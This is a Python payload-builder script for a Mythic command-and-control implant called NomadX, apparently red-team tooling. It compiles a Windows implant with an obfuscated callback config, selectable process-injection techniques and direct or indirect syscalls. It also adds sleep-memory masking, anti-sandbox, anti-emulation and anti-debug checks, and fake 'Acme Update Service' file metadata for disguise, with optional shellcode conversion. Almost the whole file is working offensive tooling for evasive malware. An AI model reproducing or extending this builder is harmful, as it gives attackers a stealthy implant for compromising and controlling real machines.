import asyncio
import pathlib
import os
import subprocess
import tempfile
import shutil
import sys
import traceback
import base64
import json
from datetime import datetime

from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


PROJECT_ROOT = pathlib.Path(__file__).resolve().parents[3]
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

from tools.pe_fix import fix_pe

INJECTION_SETS = {
    "all": ["fiber", "threadless", "kct", "poolparty", "earlycascade", "callback", "overload"],
    "stealth": ["earlycascade", "callback", "overload"],
    "remote": ["threadless", "kct", "poolparty", "earlycascade", "overload"],
    "earlycascade": ["earlycascade"],
    "callback": ["callback"],
    "overload": ["overload"],
    "fiber": ["fiber"],
    "threadless": ["threadless"],
    "kct": ["kct"],
    "poolparty": ["poolparty"],
    "none": [],
}

INJECTION_FLAGS = ["fiber", "threadless", "kct", "poolparty", "earlycascade", "callback", "overload"]


def _as_bool(value, default: bool = False) -> bool:
    if value is None:
        return default
    if isinstance(value, bool):
        return value
    if isinstance(value, str):
        return value.strip().lower() in ("true", "1", "yes", "on")
    return bool(value)


NX_CONFIG_KEY = bytes([
    0x93, 0xE9, 0x83, 0xAE, 0x31, 0xCA, 0x45, 0x8A,
    0x07, 0xB5, 0x80, 0x78, 0x13, 0x3E, 0xEB, 0xD6,
    0xD5, 0xB0, 0x07, 0x58, 0xE1, 0xA7, 0x3D, 0x76,
    0xE0, 0xBA, 0x5B, 0x01, 0x6D, 0x33, 0x3F, 0x3A,
])


def encrypt_agent_config(text: str) -> bytes:
    data = text.encode("utf-8")
    return bytes(
        byte ^ NX_CONFIG_KEY[index % len(NX_CONFIG_KEY)] ^ ((index * 37 + 11) & 0xFF)
        for index, byte in enumerate(data)
    )


def _rc_escape(value: str) -> str:
    return str(value).replace("\\", "\\\\").replace('"', '\\"')


def _donut_is_usable(path: str) -> bool:
    """Return True if the donut binary can execute in this container."""
    if not os.path.exists(path):
        return False
    try:
        result = subprocess.run(
            [path], capture_output=True, text=True, timeout=10,
        )
    except Exception:
        return False
    output = (result.stderr or "") + (result.stdout or "")
    return "GLIBC" not in output and "not found" not in output


def generate_agent_config_json(
    uuid: str,
    aes_key: str,
    callback_host: str,
    callback_port: int,
    callback_interval: int,
    callback_jitter: int,
    get_uri: str,
    post_uri: str,
    user_agent: str,
    kill_date_int: int,
    verify_tls: bool,
    proxy_host: str,
    proxy_port: int,
    sleep_mask: str = "none",
    alloc_strategy: str = "memory_hole",
    sacrificial_process: str = "",
    pre_sleep_seconds: int = 0,
    injection_step_delay_ms: int = 0,
    require_domain_joined: bool = False,
    enable_anti_sandbox: bool = True,
    enable_computational_delay: bool = True,
    enable_anti_emulation: bool = True,
    enable_anti_debug: bool = False,
    use_direct_syscalls: bool = True,
    syscall_mode: str = "indirect",
    default_injection_technique: str = "none",
    debug: bool = False,
) -> str:
    """Build the JSON document embedded by src/config.zig."""
    raw_key = b""
    if aes_key:
        stripped = aes_key.strip()
        try:
            if len(stripped) == 64:
                try:
                    raw_key = bytes.fromhex(stripped)
                except ValueError:
                    raw_key = base64.b64decode(stripped)
            else:
                raw_key = base64.b64decode(stripped)
        except Exception:
            raw_key = stripped.encode("utf-8")[:32]
    raw_key = (raw_key or b"\x00" * 32)[:32].ljust(32, b"\x00")

    config = {
        "uuid": uuid,
        "aes_key_hex": raw_key.hex(),
        "callback_host": callback_host,
        "callback_port": int(callback_port or 443),
        "callback_interval": int(callback_interval or 0),
        "callback_jitter": int(callback_jitter or 0),
        "get_uri": get_uri,
        "post_uri": post_uri,
        "user_agent": user_agent,
        "tls_verify": _as_bool(verify_tls, True),
        "proxy_host": proxy_host or "",
        "proxy_port": int(proxy_port or 0),
        "kill_date": int(kill_date_int or 0),
        "debug": bool(debug),
        "sleep_mask": sleep_mask or "none",
        "alloc_strategy": alloc_strategy or "memory_hole",
        "sacrificial_process": sacrificial_process or "",
        "pre_sleep_seconds": int(pre_sleep_seconds or 0),
        "injection_step_delay_ms": int(injection_step_delay_ms or 0),
        "require_domain_joined": _as_bool(require_domain_joined, False),
        "enable_anti_sandbox": _as_bool(enable_anti_sandbox, True),
        "enable_computational_delay": _as_bool(enable_computational_delay, True),
        "enable_anti_emulation": _as_bool(enable_anti_emulation, True),
        "enable_anti_debug": _as_bool(enable_anti_debug, False),
        "use_direct_syscalls": _as_bool(use_direct_syscalls, True),
        "syscall_mode": syscall_mode or "indirect",
        "default_injection_technique": default_injection_technique or "none",
    }
    return json.dumps(config, indent=2) + "\n"


class NomadX(PayloadType):
    name = "nomadx"
    file_extension = "exe"
    author = "@django-88"
    supported_os = [SupportedOS.Windows]
    wrapper = False
    wrapped_payloads = []
    note = (
        "NomadX - Windows x64 Zig implant. "
        "Mythic check-in/get_tasking/post_response with the existing AES-CBC/HMAC "
        "wire format. Commands: shell, sleep, exit, pwd, cd, ls, cat, whoami, ps. "
        "Sleep masks: ekko/rc4_text whole-image RC4, ekko_heap whole-image + heap-block RC4, rtl_data. The stager is not ported yet. "
        "Proxy: SOCKS5 relay and reverse port forwarding. "
        "Injection: fiber, callback, module_stomp, module_overload, threadless, kct, poolparty, earlycascade. "
        "PE: execute_pe (in-memory DLL, DllMain/export). "
        "Tokens: getprivs, steal_token, rev2self, make_token, token_store, blockdlls. "
        "File management: cp, mv, rm, mkdir, download, and upload. "
        "BOF/COFF: register_file, register_coff, execute_coff. "
        "Delivery: EXE, DLL, and custom donut shellcode (NomadEntry export)."
    )
    description = (
        "NomadX is the Zig rewrite of Nomad, installed alongside the original "
        "C++ `nomad` payload type. Core beacon: check-in/get_tasking/"
        "post_response plus shell, sleep, exit, pwd, cd, ls, cat, whoami, ps, "
        "cp, mv, rm, mkdir, download, upload, getprivs, steal_token, rev2self, "
        "make_token, token_store, blockdlls, register_file, register_coff, "
        "execute_coff, SOCKS5, rportfwd, injection (fiber, callback, "
        "module_stomp, module_overload, threadless, kct, poolparty, "
        "earlycascade), execute_pe, and sleep masks."
    )
    supports_dynamic_loading = False
    mythic_encrypts = True
    translation_container = None
    agent_type = "agent"
    agent_path = pathlib.Path(".") / "nomadx"
    agent_icon_path = agent_path / "mythic" / "agent_functions" / "nomad.svg"
    dark_mode_agent_icon_path = agent_icon_path
    agent_code_path = PROJECT_ROOT

    build_parameters = [
        BuildParameter(
            name="output_type",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["exe", "dll", "shellcode"],
            default_value="exe",
            description="EXE (standalone), DLL (rundll32/regsvr32 exports, optional DllMain start), or shellcode (custom donut). The stager is not implemented in the Zig port yet.",
        ),
        BuildParameter(
            name="alloc_strategy",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["memory_hole", "standard"],
            default_value="memory_hole",
            description="memory_hole: allocate near ntdll (+/-0x70000000 probing, stomper-friendly) | standard: ordinary allocation",
        ),
        BuildParameter(
            name="sacrificial_process",
            parameter_type=BuildParameterType.String,
            default_value="",
            description="Override target for threadless/poolparty/earlycascade (empty = per-technique default)",
        ),
        BuildParameter(
            name="pre_sleep_seconds",
            parameter_type=BuildParameterType.Number,
            default_value=0,
            description="Native pre-sleep before any C2/injection (engagement: >180)",
        ),
        BuildParameter(
            name="injection_step_delay_ms",
            parameter_type=BuildParameterType.Number,
            default_value=0,
            description="Native delay between injection phases (spawn/patch/resume/cleanup), milliseconds",
        ),
        BuildParameter(
            name="require_domain_joined",
            parameter_type=BuildParameterType.Boolean,
            default_value=False,
            description="Exit unless the host is joined to an Active Directory domain",
        ),
        BuildParameter(
            name="enable_pe_metadata",
            parameter_type=BuildParameterType.Boolean,
            default_value=True,
            description="Stamp innocuous VERSIONINFO (company/product/description) instead of MinGW defaults",
        ),
        BuildParameter(
            name="pe_company",
            parameter_type=BuildParameterType.String,
            default_value="Acme Corporation",
            description="VERSIONINFO CompanyName",
        ),
        BuildParameter(
            name="pe_product",
            parameter_type=BuildParameterType.String,
            default_value="Acme Update Service",
            description="VERSIONINFO ProductName / FileDescription",
        ),
        BuildParameter(
            name="injection_techniques",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["all", "stealth", "remote", "earlycascade", "callback", "overload", "fiber", "threadless", "kct", "poolparty", "none"],
            default_value="all",
            description="Which injection implementations are compiled into the payload",
        ),
        BuildParameter(
            name="default_injection_technique",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["none", "earlycascade", "module_overload", "callback", "fiber", "threadless", "kct", "poolparty"],
            default_value="none",
            description="Technique used by the generic inject command when Technique is empty",
        ),
        BuildParameter(
            name="use_direct_syscalls",
            parameter_type=BuildParameterType.Boolean,
            default_value=True,
            description="Master switch for the private syscall stub layer",
        ),
        BuildParameter(
            name="syscall_mode",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["indirect", "direct", "none"],
            default_value="indirect",
            description="indirect: jump to ntdll syscall;ret | direct: own syscall instruction | none: normal ntdll exports",
        ),
        BuildParameter(
            name="enable_anti_sandbox",
            parameter_type=BuildParameterType.Boolean,
            default_value=True,
            description="Anti-sandbox guardrails (uptime > 30 min, screen >= 1024x768, username/computer blocklist, win.ini sanity)",
        ),
        BuildParameter(
            name="enable_computational_delay",
            parameter_type=BuildParameterType.Boolean,
            default_value=True,
            description="Computational time delay instead of Sleep() - defeats sandbox fast-forwarding",
        ),
        BuildParameter(
            name="enable_anti_emulation",
            parameter_type=BuildParameterType.Boolean,
            default_value=True,
            description="Anti-emulation checks (failed API, env var consistency, NUMA alloc, 100M-step CPU burn)",
        ),
        BuildParameter(
            name="enable_anti_debug",
            parameter_type=BuildParameterType.Boolean,
            default_value=False,
            description="Anti-debug (PEB BeingDebugged, ProcessDebugPort, ProcessDebugObjectHandle)",
        ),
        BuildParameter(
            name="verify_tls",
            parameter_type=BuildParameterType.Boolean,
            default_value=True,
            description="Validate the C2 TLS certificate. Disable only for a known self-signed lab certificate.",
        ),
        BuildParameter(
            name="sleep_mask",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["none", "ekko", "ekko_heap", "rc4_text", "rtl_data"],
            default_value="ekko",
            description=(
                "Sleep memory mask - none: plain sleep | "
                "ekko: whole-image RC4 via a heap worker + thread quiescing | "
                "ekko_heap: whole-image RC4 plus RC4 on non-default heap blocks | "
                "rc4_text: whole-image RC4 (legacy name) | "
                "rtl_data: RtlEncryptMemory on data sections"
            ),
        ),
        BuildParameter(
            name="enable_dllmain_start",
            parameter_type=BuildParameterType.Boolean,
            default_value=False,
            description="DLL output only: start the agent from DllMain (for sideloading) instead of requiring NomadEntry/DllRegisterServer",
        ),
    ]

    c2_profiles = ["http"]

    build_steps = [
        BuildStep(step_name="Stamping Config", step_description="Generating src/agent_config.enc from C2 profile and build parameters"),
        BuildStep(step_name="Compiling", step_description="Cross-compiling with Zig"),
        BuildStep(step_name="Packaging", step_description="Packaging output (shellcode conversion if selected)"),
    ]

    async def build(self) -> BuildResponse:
        resp = BuildResponse(status=BuildStatus.Error)

        try:
            agent_code_dir = self.agent_code_path
            output_type = self.get_parameter("output_type")
            verify_tls = self.get_parameter("verify_tls")
            sleep_mask = self.get_parameter("sleep_mask") or "ekko"
            if verify_tls is None:
                verify_tls = True
            enable_dllmain_start = _as_bool(self.get_parameter("enable_dllmain_start"), False)
            alloc_strategy = self.get_parameter("alloc_strategy") or "memory_hole"
            sacrificial_process = self.get_parameter("sacrificial_process") or ""
            pre_sleep_seconds = int(self.get_parameter("pre_sleep_seconds") or 0)
            injection_step_delay_ms = int(self.get_parameter("injection_step_delay_ms") or 0)
            require_domain_joined = _as_bool(self.get_parameter("require_domain_joined"), False)
            enable_pe_metadata = _as_bool(self.get_parameter("enable_pe_metadata"), True)
            pe_company = self.get_parameter("pe_company") or "Acme Corporation"
            pe_product = self.get_parameter("pe_product") or "Acme Update Service"
            injection_techniques = self.get_parameter("injection_techniques") or "all"
            default_injection_technique = self.get_parameter("default_injection_technique") or "none"
            use_direct_syscalls = _as_bool(self.get_parameter("use_direct_syscalls"), True)
            syscall_mode = self.get_parameter("syscall_mode") or "indirect"
            enable_anti_sandbox = _as_bool(self.get_parameter("enable_anti_sandbox"), True)
            enable_computational_delay = _as_bool(self.get_parameter("enable_computational_delay"), True)
            enable_anti_emulation = _as_bool(self.get_parameter("enable_anti_emulation"), True)
            enable_anti_debug = _as_bool(self.get_parameter("enable_anti_debug"), False)

            # Extract C2 profile parameters (set by the operator in the C2 profile UI)
            if len(self.c2info) < 1:
                resp.build_stderr = "No C2 profile selected"
                return resp

            c2 = self.c2info[0]
            c2_params = c2.get_parameters_dict()

            callback_host = c2_params.get("callback_host", "https://127.0.0.1")
            if isinstance(callback_host, (list, tuple)):
                callback_host = callback_host[0] if callback_host else "https://127.0.0.1"
            callback_port = int(c2_params.get("callback_port", 443))
            callback_interval = int(c2_params.get("callback_interval", 60))
            callback_jitter = int(c2_params.get("callback_jitter", 23))
            get_uri = str(c2_params.get("get_uri", "/api/v1.4/agent_message"))
            post_uri = str(c2_params.get("post_uri", "/api/v1.4/agent_message"))
            kill_date_raw = c2_params.get("killdate", "")
            proxy_host = c2_params.get("proxy_host", "")
            proxy_port = int(c2_params.get("proxy_port", 0) or 0)

            # Extract User-Agent from headers dict
            headers = c2_params.get("headers", {})
            user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            if isinstance(headers, dict):
                user_agent = headers.get("User-Agent", user_agent)
            elif isinstance(headers, list):
                for h in headers:
                    if isinstance(h, dict) and h.get("key", "").lower() == "user-agent":
                        user_agent = h.get("value", user_agent)
                        break
            if not isinstance(user_agent, str):
                user_agent = str(user_agent)

            # Extract encryption key
            aespsk = c2_params.get("AESPSK", {})
            if isinstance(aespsk, dict):
                enc_key = aespsk.get("enc_key", "")
            else:
                enc_key = str(aespsk) if aespsk else ""

            # Parse kill date
            kill_date_int = 0
            if kill_date_raw:
                try:
                    dt = datetime.strptime(str(kill_date_raw), "%Y-%m-%d")
                    kill_date_int = int(dt.strftime("%Y%m%d"))
                except ValueError:
                    kill_date_int = 0

            agent_uuid = self.uuid

            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Stamping Config",
                StepStdout=f"C2: {callback_host}:{callback_port}",
                StepSuccess=True,
            ))

            build_dir = tempfile.mkdtemp(prefix="nomadx_build_")

            try:
                src_agent = str(agent_code_dir)
                for item in ("build.zig", "build.zig.zon"):
                    source = os.path.join(src_agent, item)
                    if not os.path.exists(source):
                        resp.build_stderr = f"missing Zig build file: {source}"
                        resp.build_message = "Agent source is incomplete"
                        return resp
                    shutil.copy2(source, os.path.join(build_dir, item))

                shutil.copytree(
                    os.path.join(src_agent, "src"),
                    os.path.join(build_dir, "src"),
                    ignore=shutil.ignore_patterns("agent_config.json", "agent_config.enc"),
                )

                config_content = generate_agent_config_json(
                    uuid=agent_uuid,
                    aes_key=enc_key,
                    callback_host=callback_host,
                    callback_port=callback_port,
                    callback_interval=callback_interval,
                    callback_jitter=callback_jitter,
                    get_uri=get_uri,
                    post_uri=post_uri,
                    user_agent=user_agent,
                    kill_date_int=kill_date_int,
                    verify_tls=verify_tls,
                    proxy_host=proxy_host,
                    proxy_port=proxy_port,
                    sleep_mask=sleep_mask,
                    alloc_strategy=alloc_strategy,
                    sacrificial_process=sacrificial_process,
                    pre_sleep_seconds=pre_sleep_seconds,
                    injection_step_delay_ms=injection_step_delay_ms,
                    require_domain_joined=require_domain_joined,
                    enable_anti_sandbox=enable_anti_sandbox,
                    enable_computational_delay=enable_computational_delay,
                    enable_anti_emulation=enable_anti_emulation,
                    enable_anti_debug=enable_anti_debug,
                    use_direct_syscalls=use_direct_syscalls,
                    syscall_mode=syscall_mode,
                    default_injection_technique=default_injection_technique,
                )
                config_path = os.path.join(build_dir, "src", "agent_config.enc")
                with open(config_path, "wb") as f:
                    f.write(encrypt_agent_config(config_content))

                zig = os.environ.get("NOMADX_ZIG") or os.environ.get("NOMAD_ZIG") or shutil.which("zig")
                if not zig:
                    resp.build_stderr = (
                        "Zig compiler not found. Install Zig 0.17.1, set NOMADX_ZIG, "
                        "or add zig to PATH in the payload container."
                    )
                    resp.build_message = "Zig toolchain missing"
                    return resp

                if output_type not in ("exe", "dll", "shellcode"):
                    resp.build_stderr = (
                        f"Output type '{output_type}' is not implemented in the Zig port yet. "
                        "Supported: exe, dll, shellcode."
                    )
                    resp.build_message = "Unsupported output type"
                    return resp

                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Compiling",
                    StepStdout=f"Cross-compiling {output_type} with Zig...",
                    StepSuccess=True,
                ))

                flags = ["build", "--release=small"]
                if output_type == "dll" and enable_dllmain_start:
                    flags.append("-Ddllmain_start=true")

                selected_injections = set(INJECTION_SETS.get(injection_techniques, INJECTION_SETS["all"]))
                for name in INJECTION_FLAGS:
                    flags.append(f"-Dinj_{name}={'true' if name in selected_injections else 'false'}")

                if enable_pe_metadata:
                    windres = shutil.which("x86_64-w64-mingw32-windres") or shutil.which("windres")
                    if not windres:
                        resp.build_stderr = "windres is required to stamp PE metadata but was not found"
                        resp.build_message = "PE metadata tool missing"
                        return resp
                    rc_path = os.path.join(build_dir, "nomadx.rc")
                    res_obj = os.path.join(build_dir, "nomadx_res.o")
                    company = _rc_escape(pe_company)
                    product = _rc_escape(pe_product)
                    rc_content = f'''#include <windows.h>
VS_VERSION_INFO VERSIONINFO
 FILEVERSION 1,0,0,0
 PRODUCTVERSION 1,0,0,0
 FILEFLAGSMASK 0x3fL
 FILEFLAGS 0x0L
 FILEOS 0x40004L
 FILETYPE 0x1L
 FILESUBTYPE 0x0L
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904b0"
        BEGIN
            VALUE "CompanyName", "{company}"
            VALUE "FileDescription", "{product}"
            VALUE "FileVersion", "1.0.0.0"
            VALUE "InternalName", "acmeupd"
            VALUE "OriginalFilename", "acmeupd.exe"
            VALUE "ProductName", "{product}"
            VALUE "ProductVersion", "1.0.0.0"
            VALUE "LegalCopyright", "Copyright (C) 2026 {company}"
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x409, 1200
    END
END
'''
                    with open(rc_path, "w", encoding="utf-8") as f:
                        f.write(rc_content)
                    rc_result = await asyncio.to_thread(
                        subprocess.run,
                        [windres, rc_path, "-O", "coff", "-o", res_obj],
                        capture_output=True,
                        text=True,
                        cwd=build_dir,
                        timeout=60,
                    )
                    if rc_result.returncode != 0:
                        resp.build_stderr = f"windres failed:\n{rc_result.stderr}\n{rc_result.stdout}"
                        resp.build_message = "PE metadata stamping failed"
                        return resp
                    flags.append("-Dresource=nomadx_res.o")

                result = await asyncio.to_thread(
                    subprocess.run,
                    [zig] + flags,
                    capture_output=True,
                    text=True,
                    cwd=build_dir,
                    timeout=600,
                )
                if result.returncode != 0:
                    resp.build_stderr = f"Zig compilation failed:\n{result.stderr}\n{result.stdout}"
                    resp.build_message = "Zig compilation failed"
                    return resp

                output_file = os.path.join(build_dir, "zig-out", "bin", "nomadx.exe")
                if output_type in ("dll", "shellcode"):
                    output_file = os.path.join(build_dir, "zig-out", "bin", "nomadx.dll")
                if not os.path.exists(output_file):
                    resp.build_stderr = f"Zig build did not produce {output_file}"
                    resp.build_message = "Zig output missing"
                    return resp

                fix_pe(output_file)

                if output_type == "shellcode":
                    dll_path = output_file
                    sc_path = os.path.join(build_dir, "nomadx.bin")

                    custom_donut_dir = os.path.join(
                        os.path.dirname(os.path.abspath(__file__)), "..", "..", "custom-donut"
                    )
                    custom_donut_bin = os.path.join(custom_donut_dir, "donut")

                    if not _donut_is_usable(custom_donut_bin):
                        make_bin = shutil.which("make")
                        if not make_bin:
                            resp.build_stderr = (
                                "custom donut is not runnable and make is unavailable "
                                f"in the payload container ({custom_donut_bin})"
                            )
                            resp.build_message = "Shellcode conversion failed"
                            return resp
                        donut_build = await asyncio.to_thread(
                            subprocess.run,
                            [make_bin, "-C", custom_donut_dir, "donut"],
                            capture_output=True, text=True, timeout=180,
                        )
                        if donut_build.returncode != 0 or not _donut_is_usable(custom_donut_bin):
                            resp.build_stderr = (
                                "custom donut rebuild failed:\n"
                                f"{donut_build.stderr}\n{donut_build.stdout}"
                            )
                            resp.build_message = "Shellcode conversion failed"
                            return resp

                    for loader_name in ["loader_exe_x64.bin", "loader.bin"]:
                        loader_src = os.path.join(custom_donut_dir, loader_name)
                        if os.path.exists(loader_src):
                            shutil.copy2(loader_src, os.path.join(build_dir, loader_name))

                    # Invoke NomadEntry instead of letting donut call DllMain.
                    # Donut unmaps the DLL immediately after DllMain returns,
                    # which kills a beacon thread started from DllMain.  The
                    # export runs the beacon loop inline, so the module stays
                    # mapped until the agent exits.
                    donut_result = await asyncio.to_thread(
                        subprocess.run,
                        [
                            custom_donut_bin, "-i", dll_path, "-o", sc_path,
                            "-a", "2", "-f", "1", "-e", "3",
                            "-m", "NomadEntry",
                        ],
                        capture_output=True,
                        text=True,
                        cwd=build_dir,
                        timeout=60,
                    )
                    if donut_result.returncode != 0:
                        resp.build_stderr = (
                            f"Custom donut conversion failed: {donut_result.stderr}\n{donut_result.stdout}"
                        )
                        resp.build_message = "Shellcode conversion failed"
                        return resp
                    output_file = sc_path

                with open(output_file, "rb") as f:
                    payload_bytes = f.read()

                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Packaging",
                    StepStdout=f"{output_type.upper()} built: {len(payload_bytes)} bytes",
                    StepSuccess=True,
                ))

                resp.status = BuildStatus.Success
                resp.payload = payload_bytes
                resp.build_message = f"NomadX Zig {output_type} built ({len(payload_bytes)} bytes)"

            finally:
                shutil.rmtree(build_dir, ignore_errors=True)

        except Exception as e:
            resp.build_stderr = f"Build exception: {str(e)}\n{traceback.format_exc()}"
            resp.build_message = "Build failed with exception"

        return resp
